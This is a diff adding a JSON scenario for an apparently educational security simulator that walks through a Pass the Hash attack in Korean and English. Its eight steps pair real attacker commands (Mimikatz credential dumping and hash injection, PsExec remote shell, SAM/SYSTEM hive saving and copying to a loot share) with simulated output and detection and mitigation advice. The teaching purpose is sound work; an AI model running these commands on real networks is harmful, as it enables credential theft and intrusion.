@@ -1,0 +1,260 @@
+{
+  "id": "T1550.002",
+  "title": "패스 더 해시 시뮬레이션",
+  "titleEn": "Pass the Hash Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "정찰", "labelEn": "Recon", "icon": "🔍" },
+    { "label": "공격", "labelEn": "Attack", "icon": "⚡" },
+    { "label": "침투", "labelEn": "Breach", "icon": "🔓" },
+    { "label": "완료", "labelEn": "Complete", "icon": "✅" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "x": 80, "y": 150, "type": "attacker" },
+    { "id": "target", "label": "Workstation", "x": 250, "y": 150, "type": "server" },
+    { "id": "fileserver", "label": "File Server", "x": 420, "y": 150, "type": "server" },
+    { "id": "dc", "label": "DC01", "x": 420, "y": 50, "type": "server" },
+    { "id": "siem", "label": "SIEM", "x": 560, "y": 150, "type": "defense" }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "target", "label": "Mimikatz", "activeStep": 0 },
+    { "from": "target", "to": "target", "label": "Hash Dump", "activeStep": 1 },
+    { "from": "target", "to": "fileserver", "label": "PTH Lateral", "activeStep": 3 },
+    { "from": "fileserver", "to": "dc", "label": "Auth", "activeStep": 4 },
+    { "from": "fileserver", "to": "siem", "label": "Alert", "activeStep": 4 }
+  ],
+  "desktopIcons": [
+    { "label": "Mimikatz", "icon": "🔑", "alertOnStep": 0 },
+    { "label": "PsExec", "icon": "💻", "alertOnStep": 4 },
+    { "label": "Loot", "icon": "📦", "alertOnStep": 6 }
+  ],
+  "steps": [
+    {
+      "cmd": "mimikatz.exe \"privilege::debug\"",
+      "out": "Privilege '20' OK\n\nSe_Debug privilege enabled.\nmimikatz #",
+      "def": "[EDR] High-privilege token adjustment detected",
+      "defAction": "Process: mimikatz.exe (PID: 4820)\nAction: TOKEN_ADJUST_PRIVILEGES\nPrivilege: SeDebugPrivilege\nRisk: HIGH",
+      "desc": "공격자가 SeDebugPrivilege를 활성화하여 다른 프로세스의 메모리에 접근할 수 있도록 합니다.",
+      "descEn": "The attacker enables SeDebugPrivilege to gain access to other process memory spaces.",
+      "stepTitle": "디버그 권한 활성화",
+      "stepTitleEn": "Enable Debug Privilege",
+      "feynman": "마치 아파트 관리인 마스터키를 얻는 것과 같습니다. 이 특별한 권한이 있으면 다른 프로그램의 '방'에 들어가 내부를 들여다볼 수 있습니다. 일반 사용자는 자기 방만 열 수 있지만, 디버그 권한이 있으면 모든 방의 잠금을 풀 수 있습니다.",
+      "feynmanEn": "It's like obtaining a master key for an apartment building. With this special privilege, you can enter other programs' 'rooms' and peek inside. Normal users can only open their own room, but with debug privilege, you can unlock every door.",
+      "expert": "SeDebugPrivilege는 Windows 접근 토큰에서 SE_DEBUG_NAME(0x14)에 해당하며, PROCESS_ALL_ACCESS 핸들을 얻을 수 있게 합니다. MITRE ATT&CK T1134에도 연관되며, Sysmon Event ID 10(ProcessAccess)으로 모니터링 가능합니다. 기본적으로 관리자 그룹에 부여되지만 GPO로 제한해야 합니다.",
+      "expertEn": "SeDebugPrivilege corresponds to SE_DEBUG_NAME (0x14) in Windows access tokens, enabling PROCESS_ALL_ACCESS handles. Related to MITRE ATT&CK T1134, monitorable via Sysmon Event ID 10 (ProcessAccess). Granted to Administrators by default but should be restricted via GPO.",
+      "defTooltip": "Sysmon Event ID 10에서 GrantedAccess가 0x1F0FFF인 프로세스 접근을 확인하세요. Windows Security Event ID 4703에서 SeDebugPrivilege 활성화를 모니터링합니다.",
+      "defTooltipEn": "Check Sysmon Event ID 10 for process access with GrantedAccess 0x1F0FFF. Monitor Windows Security Event ID 4703 for SeDebugPrivilege enablement.",
+      "hackerLog": {
+        "title": "privilege_debug.log",
+        "lines": [
+          { "log": "mimikatz.exe \"privilege::debug\"", "desc": "💡 Mimikatz를 실행하여 디버그 권한을 요청합니다" },
+          { "log": "Privilege '20' OK", "desc": "💡 권한 번호 20(SeDebugPrivilege)이 성공적으로 활성화되었습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "SeDebugPrivilege", "desc": "다른 프로세스의 메모리를 읽거나 쓸 수 있게 하는 Windows 특수 권한입니다" },
+        { "term": "LSASS", "desc": "Local Security Authority Subsystem Service - 사용자 인증 정보를 관리하는 Windows 핵심 보안 프로세스입니다" }
+      ]
+    },
+    {
+      "cmd": "mimikatz # sekurlsa::logonpasswords",
+      "out": "Authentication Id : 0 ; 999 (00000000:000003e7)\nSession           : Interactive from 1\nUser Name         : {userName}\nDomain            : {companyName}\nLogon Server      : DC01\nLogon Time        : 2026/03/01 09:14:22\n\n  * NTLM     : aad3b435b51404eeaad3b435b51404ee\n  * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709\n  * DPAPI    : 9f2c5a8e3d1b7c4f6e0a2d8b\n\nAuthentication Id : 0 ; 48221\nUser Name         : svc_backup\nDomain            : {companyName}\nNTLM              : e19ccf75ee54e06b06a5907af13cef42",
+      "def": "[EDR] LSASS memory access detected from suspicious process",
+      "defAction": "Process: mimikatz.exe (PID: 4820)\nTarget: lsass.exe (PID: 672)\nAccess: PROCESS_VM_READ\nRisk: CRITICAL\nAction: Alert generated, process quarantine recommended",
+      "desc": "공격자가 LSASS 프로세스 메모리에서 NTLM 해시를 포함한 인증 정보를 덤프합니다.",
+      "descEn": "The attacker dumps authentication credentials including NTLM hashes from LSASS process memory.",
+      "stepTitle": "자격 증명 덤프",
+      "stepTitleEn": "Credential Dumping",
+      "feynman": "우체국에서 모든 사람의 편지를 열어보는 것과 비슷합니다. LSASS는 모든 사용자의 '로그인 표'를 보관하는 금고인데, 공격자가 이 금고를 열어 모든 사람의 비밀번호 '지문'(해시)을 복사합니다.",
+      "feynmanEn": "It's like opening everyone's mail at the post office. LSASS is a vault that stores every user's 'login ticket', and the attacker opens this vault to copy everyone's password 'fingerprints' (hashes).",
+      "expert": "sekurlsa::logonpasswords는 LSASS 프로세스 메모리에서 MSV1_0, WDigest, Kerberos 인증 패키지의 자격 증명을 추출합니다. Windows 10 이상에서는 WDigest 평문 비밀번호가 비활성화되어 있지만, NTLM 해시는 여전히 추출 가능합니다. Credential Guard(VBS)가 활성화되면 이 공격을 차단할 수 있습니다.",
+      "expertEn": "sekurlsa::logonpasswords extracts credentials from MSV1_0, WDigest, and Kerberos authentication packages in LSASS memory. WDigest plaintext passwords are disabled on Windows 10+, but NTLM hashes remain extractable. Credential Guard (VBS) can block this attack.",
+      "defTooltip": "Sysmon Event ID 10에서 lsass.exe를 대상으로 한 PROCESS_VM_READ 접근을 모니터링하세요. Event ID 4624(Type 9)와 Event ID 4648(Explicit Credential Logon)도 확인합니다.",
+      "defTooltipEn": "Monitor Sysmon Event ID 10 for PROCESS_VM_READ access targeting lsass.exe. Also check Event ID 4624 (Type 9) and Event ID 4648 (Explicit Credential Logon).",
+      "hackerLog": {
+        "title": "credential_dump.log",
+        "lines": [
+          { "log": "sekurlsa::logonpasswords", "desc": "💡 LSASS 메모리에서 모든 로그온 세션의 자격 증명을 추출하는 명령입니다" },
+          { "log": "NTLM : e19ccf75ee54e06b06a5907af13cef42", "desc": "💡 svc_backup 계정의 NTLM 해시가 탈취되었습니다 - PTH 공격에 사용됩니다" }
+        ]
+      },
+      "terms": [
+        { "term": "NTLM Hash", "desc": "비밀번호를 일방향 함수로 변환한 값으로, 원래 비밀번호 없이도 인증에 사용할 수 있습니다" },
+        { "term": "Credential Dump", "desc": "시스템 메모리나 파일에서 사용자 인증 정보를 대량으로 추출하는 공격 기법입니다" }
+      ]
+    },
+    {
+      "cmd": "mimikatz # sekurlsa::pth /user:svc_backup /domain:{companyName} /ntlm:e19ccf75ee54e06b06a5907af13cef42 /run:cmd.exe",
+      "out": "user    : svc_backup\ndomain  : {companyName}\nprogram : cmd.exe\nimpers. : no\nNTLM    : e19ccf75ee54e06b06a5907af13cef42\n  |  PID  7312\n  |  TID  7316\n  |  LSA Process is now R/W\n  |  LUID 0 ; 5765432 (00000000:00580938)\n  \\_ msv1_0   - data copy @ 000001A2B3C4D5E6 : OK !\n  \\_ kerberos - data copy @ 000001A2B3C4D5F0\n   \\_ des_cbc_md4       -> null\n   \\_ des_cbc_md4       OK\n   \\_ rc4_hmac_nt       OK\n   \\_ rc4_hmac_old      OK\n   \\_ rc4_md4           OK\n   \\_ rc4_hmac_nt_exp   OK\n   \\_ rc4_hmac_old_exp  OK\n   \\_ *Password replace @ 000001A2B3C4D600",
+      "def": "[SIEM] New logon session created with injected credentials",
+      "defAction": "Event ID: 4624 (Type 9 - NewCredentials)\nUser: svc_backup\nSource: mimikatz.exe\nLogon Process: seclogo\nRisk: CRITICAL",
+      "desc": "탈취한 NTLM 해시를 사용하여 svc_backup 계정으로 새 CMD 세션을 생성합니다. 비밀번호 없이 인증이 가능합니다.",
+      "descEn": "Creates a new CMD session as svc_backup using the stolen NTLM hash. Authentication is possible without the plaintext password.",
+      "stepTitle": "패스 더 해시 실행",
+      "stepTitleEn": "Execute Pass the Hash",
+      "feynman": "도장을 위조하여 다른 사람인 척 서류에 서명하는 것과 같습니다. 비밀번호 자체를 알 필요 없이 비밀번호의 '지문'(해시)만으로 시스템에 '나는 svc_backup이다'라고 거짓말할 수 있습니다.",
+      "feynmanEn": "It's like forging someone's stamp to sign documents as them. Without knowing the actual password, you can tell the system 'I am svc_backup' using just the password 'fingerprint' (hash).",
+      "expert": "Pass the Hash는 NTLM 인증 프로토콜의 설계적 취약점을 악용합니다. sekurlsa::pth는 새 프로세스의 LSASS 세션에 NTLM 해시를 직접 주입하여 Type 9(NewCredentials) 로그온을 생성합니다. 이 공격은 Kerberos AES 인증으로 전환하거나, Windows Credential Guard를 활성화하여 완화할 수 있습니다.",
+      "expertEn": "Pass the Hash exploits a design vulnerability in the NTLM authentication protocol. sekurlsa::pth injects NTLM hashes directly into a new process's LSASS session, creating a Type 9 (NewCredentials) logon. Mitigate by switching to Kerberos AES authentication or enabling Windows Credential Guard.",
+      "defTooltip": "Windows Security Event ID 4624에서 Logon Type 9(NewCredentials)를 필터링하세요. 특히 Logon Process가 'seclogo'인 경우 PTH 공격 가능성이 높습니다.",
+      "defTooltipEn": "Filter Windows Security Event ID 4624 for Logon Type 9 (NewCredentials). Logon Process 'seclogo' strongly indicates a PTH attack.",
+      "hackerLog": {
+        "title": "pth_execution.log",
+        "lines": [
+          { "log": "sekurlsa::pth /user:svc_backup /ntlm:e19ccf75...", "desc": "💡 탈취한 해시로 svc_backup 계정을 가장하여 새 프로세스를 생성합니다" },
+          { "log": "LSA Process is now R/W", "desc": "💡 LSASS 프로세스에 읽기/쓰기 권한을 획득하여 인증 데이터를 교체했습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "Pass the Hash (PTH)", "desc": "비밀번호 해시만으로 인증을 통과하는 공격 기법으로, NTLM 프로토콜의 구조적 취약점을 악용합니다" },
+        { "term": "Type 9 Logon", "desc": "NewCredentials 유형의 로그온으로, 네트워크 리소스 접근 시 주입된 자격 증명을 사용합니다" }
+      ]
+    },
+    {
+      "cmd": "dir \\\\fileserver01.{companyName}.local\\C$\\Users",
+      "out": " Volume in drive \\\\fileserver01 has no label.\n Volume Serial Number is 4A2B-8C3D\n\n Directory of \\\\fileserver01.{companyName}.local\\C$\\Users\n\n2026/02/28  14:22    <DIR>          .\n2026/02/28  14:22    <DIR>          ..\n2026/01/15  09:30    <DIR>          Administrator\n2026/02/20  11:45    <DIR>          {userName}\n2026/02/28  14:22    <DIR>          svc_backup\n2026/01/10  08:00    <DIR>          Public\n               0 File(s)              0 bytes\n               6 Dir(s)  45,234,567,168 bytes free",
+      "def": "[NDR] SMB lateral movement detected - admin share access",
+      "defAction": "Source: 10.10.15.22 (WS-{userName})\nTarget: 10.10.15.50 (fileserver01)\nShare: C$\nUser: svc_backup\nRisk: HIGH",
+      "desc": "패스 더 해시로 생성한 세션을 통해 원격 서버의 C$ 관리 공유에 접근하여 파일 시스템을 열람합니다.",
+      "descEn": "Accesses the remote server's C$ administrative share through the Pass the Hash session to browse the file system.",
+      "stepTitle": "관리 공유 접근",
+      "stepTitleEn": "Admin Share Access",
+      "feynman": "위조한 사원증으로 다른 건물에 출입하는 것과 같습니다. 공격자는 훔친 '통행증'(NTLM 해시)으로 파일 서버 건물에 들어가 관리자 전용 구역(C$ 공유)까지 자유롭게 돌아다닙니다.",
+      "feynmanEn": "It's like entering another building with a forged employee badge. The attacker uses a stolen 'pass' (NTLM hash) to enter the file server building and freely roam the administrator-only area (C$ share).",
+      "expert": "C$ 관리 공유 접근은 SMB(445/TCP)를 통해 이루어지며, 이는 Lateral Movement(T1021.002)의 대표적 지표입니다. NDR(Network Detection and Response) 솔루션에서 내부 네트워크의 SMB 트래픽에서 비정상적인 admin share 접근 패턴을 모니터링해야 합니다.",
+      "expertEn": "C$ admin share access occurs via SMB (445/TCP) and is a classic indicator of Lateral Movement (T1021.002). NDR solutions should monitor internal network SMB traffic for abnormal admin share access patterns.",
+      "defTooltip": "Windows Security Event ID 5140(네트워크 공유 접근)과 Event ID 5145(공유 개체 접근 검사)를 모니터링하세요. C$, ADMIN$ 공유에 대한 원격 접근은 주의가 필요합니다.",
+      "defTooltipEn": "Monitor Windows Security Event ID 5140 (Network Share Access) and Event ID 5145 (Shared Object Access Check). Remote access to C$ and ADMIN$ shares requires attention.",
+      "hackerLog": {
+        "title": "lateral_movement.log",
+        "lines": [
+          { "log": "dir \\\\fileserver01\\C$\\Users", "desc": "💡 PTH 세션으로 원격 파일 서버의 관리자 공유 폴더에 접근합니다" },
+          { "log": "6 Dir(s)  45,234,567,168 bytes free", "desc": "💡 파일 서버 접근에 성공하여 사용자 디렉토리 목록을 확인했습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "C$ Share", "desc": "Windows의 숨겨진 관리 공유로, 관리자 권한이 있는 사용자만 원격 접근이 가능합니다" },
+        { "term": "Lateral Movement", "desc": "내부 네트워크에서 한 시스템에서 다른 시스템으로 이동하는 공격 기법입니다" }
+      ]
+    },
+    {
+      "cmd": "psexec.exe \\\\fileserver01.{companyName}.local -accepteula cmd.exe",
+      "out": "PsExec v2.43 - Execute processes remotely\nCopyright (C) 2001-2023 Mark Russinovich\nSysinternals - www.sysinternals.com\n\nConnecting to fileserver01.{companyName}.local...\nStarting PSEXESVC service on fileserver01...\nConnecting with PsExec service on fileserver01...\nStarting cmd.exe on fileserver01...\n\nMicrosoft Windows [Version 10.0.20348.2340]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>",
+      "def": "[EDR] Remote service installation detected - PsExec pattern",
+      "defAction": "Source: 10.10.15.22\nTarget: fileserver01 (10.10.15.50)\nService: PSEXESVC\nEvent ID: 7045 (Service Install)\nRisk: CRITICAL\nAction: Blocking lateral movement",
+      "desc": "PsExec를 사용하여 원격 서버에 서비스를 설치하고 명령 셸을 획득합니다. NTLM 해시 인증이 자동 적용됩니다.",
+      "descEn": "Uses PsExec to install a service on the remote server and obtain a command shell. NTLM hash authentication is applied automatically.",
+      "stepTitle": "원격 셸 획득",
+      "stepTitleEn": "Remote Shell Acquisition",
+      "feynman": "택배 기사가 건물에 임시 사무실을 열어주는 것과 비슷합니다. PsExec는 원격 서버에 작은 '서비스 프로그램'을 설치하고, 이 프로그램을 통해 마치 직접 그 컴퓨터 앞에 앉아 있는 것처럼 명령을 내릴 수 있게 합니다.",
+      "feynmanEn": "It's like a delivery person opening a temporary office inside a building. PsExec installs a small 'service program' on the remote server, allowing commands as if sitting directly in front of that computer.",
+      "expert": "PsExec는 ADMIN$ 공유에 PSEXESVC.exe를 업로드하고 SCM(Service Control Manager)을 통해 원격 서비스를 등록합니다. Windows Event ID 7045(서비스 설치)와 Sysmon Event ID 1(프로세스 생성)으로 탐지 가능합니다. 실제 침해에서는 PsExec 대신 WMI, WinRM, DCOM 등의 대안 기법도 자주 사용됩니다.",
+      "expertEn": "PsExec uploads PSEXESVC.exe to ADMIN$ share and registers a remote service via SCM (Service Control Manager). Detectable via Windows Event ID 7045 (Service Install) and Sysmon Event ID 1 (Process Creation). In real attacks, alternatives like WMI, WinRM, and DCOM are also frequently used.",
+      "defTooltip": "Windows System Event ID 7045에서 PSEXESVC 서비스 설치를 모니터링하세요. Sysmon Event ID 13(레지스트리 값 설정)에서 Services\\PSEXESVC 키 생성을 탐지합니다.",
+      "defTooltipEn": "Monitor Windows System Event ID 7045 for PSEXESVC service installation. Detect Services\\PSEXESVC key creation in Sysmon Event ID 13 (Registry Value Set).",
+      "hackerLog": {
+        "title": "psexec_shell.log",
+        "lines": [
+          { "log": "Starting PSEXESVC service on fileserver01...", "desc": "💡 원격 서버에 PsExec 서비스가 설치되어 원격 명령 실행이 가능해집니다" },
+          { "log": "C:\\Windows\\system32>", "desc": "💡 파일 서버에서 SYSTEM 권한의 명령 프롬프트를 획득했습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "PsExec", "desc": "Sysinternals에서 제공하는 원격 명령 실행 도구로, 공격자가 내부 이동에 자주 악용합니다" },
+        { "term": "PSEXESVC", "desc": "PsExec가 원격 시스템에 설치하는 서비스로, 명령 실행 파이프라인을 제공합니다" }
+      ]
+    },
+    {
+      "cmd": "whoami /all & hostname & ipconfig /brief",
+      "out": "USER INFORMATION\n----------------\nUser Name            SID\n==================== ============================\n{companyName}\\svc_backup   S-1-5-21-3842939050-3880317879-2865463114-1122\n\nGROUP INFORMATION\n-----------------\nGroup Name                      Type\n=============================== ================\n{companyName}\\Domain Users       Group\n{companyName}\\Backup Operators   Alias\nBUILTIN\\Administrators          Alias\nNT AUTHORITY\\INTERACTIVE        Well-known group\n\nPRIVILEGES INFORMATION\n----------------------\nSeBackupPrivilege               Enabled\nSeRestorePrivilege              Enabled\n\nHostname: FILESERVER01\n\nWindows IP Configuration\nEthernet0: 10.10.15.50/24",
+      "def": "[SIEM] Reconnaissance commands executed on compromised host",
+      "defAction": "Host: fileserver01\nUser: svc_backup\nCommands: whoami, hostname, ipconfig\nPattern: Post-exploitation reconnaissance\nRisk: HIGH",
+      "desc": "원격 서버에서 현재 세션 정보를 확인합니다. Backup Operators 그룹 멤버십과 관리자 권한을 확인할 수 있습니다.",
+      "descEn": "Verifies current session information on the remote server. Backup Operators group membership and administrator privileges are confirmed.",
+      "stepTitle": "세션 정보 확인",
+      "stepTitleEn": "Session Info Verification",
+      "feynman": "건물에 침입한 후 '여기가 어디지?'라고 주변을 살피는 것과 같습니다. 공격자는 자신이 어떤 권한을 가지고 있는지, 어떤 서버에 있는지, 네트워크 주소가 무엇인지 확인하여 다음 행동을 계획합니다.",
+      "feynmanEn": "It's like looking around after breaking into a building asking 'Where am I?' The attacker checks what privileges they have, which server they're on, and the network address to plan their next move.",
+      "expert": "Post-exploitation 정찰에서 Backup Operators 그룹은 특히 중요합니다. SeBackupPrivilege로 SAM/SYSTEM 하이브를 포함한 모든 파일을 읽을 수 있고, SeRestorePrivilege로 모든 파일을 수정할 수 있습니다. 이 권한으로 도메인 컨트롤러의 NTDS.dit도 추출 가능합니다.",
+      "expertEn": "In post-exploitation recon, the Backup Operators group is particularly significant. SeBackupPrivilege allows reading all files including SAM/SYSTEM hives, and SeRestorePrivilege enables modifying all files. These privileges can even extract NTDS.dit from domain controllers.",
+      "defTooltip": "여러 정찰 명령(whoami, hostname, ipconfig)이 짧은 시간 내 연속 실행되면 EDR에서 'Post-Exploitation Recon' 패턴으로 탐지합니다. Sysmon Event ID 1의 CommandLine 필드를 분석하세요.",
+      "defTooltipEn": "Multiple reconnaissance commands (whoami, hostname, ipconfig) executed in rapid succession trigger 'Post-Exploitation Recon' pattern in EDR. Analyze the CommandLine field in Sysmon Event ID 1.",
+      "hackerLog": {
+        "title": "post_exploitation_recon.log",
+        "lines": [
+          { "log": "Backup Operators   Alias", "desc": "💡 svc_backup 계정이 Backup Operators 그룹에 속해 있어 모든 파일 읽기가 가능합니다" },
+          { "log": "SeBackupPrivilege  Enabled", "desc": "💡 백업 권한으로 SAM/SYSTEM 레지스트리 하이브 추출이 가능합니다" }
+        ]
+      },
+      "terms": [
+        { "term": "Backup Operators", "desc": "시스템의 모든 파일을 읽고 백업할 수 있는 권한을 가진 Windows 내장 그룹입니다" },
+        { "term": "SeBackupPrivilege", "desc": "파일 접근 권한을 무시하고 모든 파일을 읽을 수 있게 하는 Windows 특수 권한입니다" }
+      ]
+    },
+    {
+      "cmd": "reg save HKLM\\SAM C:\\temp\\sam.hive & reg save HKLM\\SYSTEM C:\\temp\\system.hive",
+      "out": "The operation completed successfully.\nThe operation completed successfully.",
+      "def": "[EDR] Registry hive extraction detected - credential theft indicator",
+      "defAction": "Host: fileserver01\nProcess: reg.exe\nTarget: HKLM\\SAM, HKLM\\SYSTEM\nAction: Registry hive saved to disk\nRisk: CRITICAL\nResponse: File quarantine initiated",
+      "desc": "SAM과 SYSTEM 레지스트리 하이브를 파일로 저장합니다. 이 파일들로 로컬 계정의 비밀번호 해시를 오프라인 추출할 수 있습니다.",
+      "descEn": "Saves the SAM and SYSTEM registry hives to files. These files can be used to extract local account password hashes offline.",
+      "stepTitle": "레지스트리 하이브 추출",
+      "stepTitleEn": "Registry Hive Extraction",
+      "feynman": "은행 금고 안의 고객 명부를 복사하는 것과 같습니다. SAM 파일에는 모든 로컬 계정의 비밀번호 해시가 저장되어 있고, SYSTEM 파일에는 이를 해독하는 데 필요한 '열쇠'가 들어있습니다. 둘 다 있으면 모든 계정의 비밀번호를 크래킹할 수 있습니다.",
+      "feynmanEn": "It's like copying the customer registry from inside a bank vault. The SAM file contains password hashes for all local accounts, and the SYSTEM file holds the 'key' needed to decrypt them. With both, all account passwords can be cracked.",
+      "expert": "SAM 하이브에는 NTLMv2 해시가 SYSKEY(부트키)로 암호화되어 저장됩니다. SYSTEM 하이브에서 SYSKEY를 추출한 후 SAM의 해시를 복호화합니다. secretsdump.py, samdump2 등의 도구로 오프라인 분석이 가능합니다. LSA Secrets도 SYSTEM 하이브와 함께 추출하면 서비스 계정 비밀번호를 획득할 수 있습니다.",
+      "expertEn": "SAM hive stores NTLMv2 hashes encrypted with SYSKEY (boot key). SYSKEY is extracted from SYSTEM hive to decrypt SAM hashes. Tools like secretsdump.py and samdump2 enable offline analysis. LSA Secrets extracted with SYSTEM hive can reveal service account passwords.",
+      "defTooltip": "Sysmon Event ID 11(파일 생성)에서 .hive 확장자 파일 생성을 모니터링하세요. Windows Security Event ID 4657(레지스트리 값 수정)에서 HKLM\\SAM, HKLM\\SYSTEM 접근을 추적합니다.",
+      "defTooltipEn": "Monitor Sysmon Event ID 11 (File Creation) for .hive extension files. Track HKLM\\SAM and HKLM\\SYSTEM access in Windows Security Event ID 4657 (Registry Value Modified).",
+      "hackerLog": {
+        "title": "reg_hive_save.log",
+        "lines": [
+          { "log": "reg save HKLM\\SAM C:\\temp\\sam.hive", "desc": "💡 모든 로컬 계정 비밀번호 해시가 저장된 SAM 데이터베이스를 파일로 추출합니다" },
+          { "log": "reg save HKLM\\SYSTEM C:\\temp\\system.hive", "desc": "💡 SAM 해시를 복호화하는 데 필요한 SYSKEY가 포함된 SYSTEM 하이브를 추출합니다" }
+        ]
+      },
+      "terms": [
+        { "term": "SAM (Security Account Manager)", "desc": "Windows 로컬 계정의 비밀번호 해시를 저장하는 레지스트리 데이터베이스입니다" },
+        { "term": "SYSKEY", "desc": "SAM 데이터베이스의 해시를 추가로 암호화하는 부트 키로, SYSTEM 하이브에 저장됩니다" }
+      ]
+    },
+    {
+      "cmd": "copy C:\\temp\\*.hive \\\\10.10.15.22\\C$\\loot\\",
+      "out": "C:\\temp\\sam.hive\nC:\\temp\\system.hive\n        2 file(s) copied.",
+      "def": "[NDR] Suspicious file transfer detected - registry hive exfiltration",
+      "defAction": "Source: fileserver01 (10.10.15.50)\nTarget: 10.10.15.22 (WS-{userName})\nFiles: sam.hive, system.hive\nSize: 256 KB, 12.4 MB\nRisk: CRITICAL\nAction: Network segment isolation recommended",
+      "desc": "추출한 레지스트리 하이브 파일을 공격자 워크스테이션으로 복사합니다. 이를 통해 추가 계정의 해시를 확보할 수 있습니다.",
+      "descEn": "Copies the extracted registry hive files back to the attacker's workstation. This enables obtaining additional account hashes.",
+      "stepTitle": "데이터 유출",
+      "stepTitleEn": "Data Exfiltration",
+      "feynman": "은행에서 훔친 문서를 비밀 통로로 자기 집에 보내는 것과 같습니다. 공격자는 파일 서버에서 추출한 '비밀번호 금고 사본'을 자신의 컴퓨터로 복사하여, 나중에 편안하게 크래킹 작업을 수행합니다.",
+      "feynmanEn": "It's like sending stolen bank documents back home through a secret passage. The attacker copies the 'password vault copies' extracted from the file server to their own computer for comfortable cracking later.",
+      "expert": "SMB를 통한 데이터 유출은 NDR(Network Detection and Response) 솔루션으로 탐지 가능합니다. 내부 네트워크에서 레지스트리 하이브 파일(.hive)의 SMB 전송은 명백한 침해 지표입니다. YARA 규칙으로 SMB 트래픽 내 SAM/SYSTEM 하이브 시그니처를 탐지할 수 있습니다.",
+      "expertEn": "Data exfiltration via SMB is detectable by NDR solutions. SMB transfer of registry hive files (.hive) within internal networks is a clear indicator of compromise. YARA rules can detect SAM/SYSTEM hive signatures within SMB traffic.",
+      "defTooltip": "NDR에서 내부 네트워크의 SMB 파일 전송을 모니터링하세요. Windows Security Event ID 5145에서 .hive 파일에 대한 공유 접근을 추적합니다. 비정상적인 파일 크기의 SMB 전송도 DLP에서 감시해야 합니다.",
+      "defTooltipEn": "Monitor SMB file transfers within internal networks using NDR. Track shared access to .hive files in Windows Security Event ID 5145. DLP should also monitor SMB transfers with abnormal file sizes.",
+      "hackerLog": {
+        "title": "exfiltration.log",
+        "lines": [
+          { "log": "copy C:\\temp\\*.hive \\\\10.10.15.22\\C$\\loot\\", "desc": "💡 추출한 레지스트리 하이브 파일을 공격자의 머신으로 SMB를 통해 복사합니다" },
+          { "log": "2 file(s) copied.", "desc": "💡 SAM과 SYSTEM 하이브 모두 성공적으로 유출되었습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "Exfiltration", "desc": "침해된 시스템에서 민감한 데이터를 공격자가 제어하는 외부 위치로 전송하는 행위입니다" },
+        { "term": "NDR", "desc": "Network Detection and Response - 네트워크 트래픽을 분석하여 위협을 탐지하고 대응하는 보안 솔루션입니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "mimikatz.exe (PID: 4820)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "cmd.exe (PID: 7312) [PTH: svc_backup]", "depth": 2, "alert": true, "minStep": 2 },
+    { "name": "dir.exe (remote enum)", "depth": 3, "alert": false, "minStep": 3 },
+    { "name": "psexec.exe (PID: 7500)", "depth": 3, "alert": true, "minStep": 4 },
+    { "name": "PSEXESVC.exe → cmd.exe [fileserver01]", "depth": 4, "alert": true, "minStep": 4 },
+    { "name": "whoami.exe (PID: 3200)", "depth": 5, "alert": false, "minStep": 5 },
+    { "name": "reg.exe (PID: 3344)", "depth": 5, "alert": true, "minStep": 6 },
+    { "name": "copy → SMB transfer", "depth": 5, "alert": true, "minStep": 7 }
+  ]
+}
